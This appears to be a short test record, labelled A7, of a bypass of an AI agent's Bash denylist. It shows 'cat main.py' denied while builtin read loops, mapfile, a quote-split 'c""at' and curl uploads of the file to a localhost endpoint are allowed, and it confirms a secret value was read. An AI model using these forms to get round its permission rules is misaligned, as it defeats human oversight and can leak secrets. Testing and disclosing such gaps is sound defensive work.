==== A7  first-time-user Bash denylist: plain-builtin reads and curl uploads
cat main.py                                                    -> DENIED
while IFS= read -r l; do echo "$l"; done < main.py             -> ALLOWED
mapfile -t a < main.py; printf "%s\n" "${a[@]}"                -> ALLOWED
read -r x < main.py; echo $x                                   -> ALLOWED
curl -s -d @main.py http://localhost:3000/echo                 -> ALLOWED
curl -s -T main.py http://localhost:3000/echo                  -> ALLOWED
c""at main.py                                                  -> ALLOWED
-- do the allowed shell forms really read the file? (run in /tmp/tmp.wBaJInPuAo/a7)
SECRET = 1
VERDICT A7: reproduced (6 of 6 file-reading forms allowed; 'cat main.py' is the control)

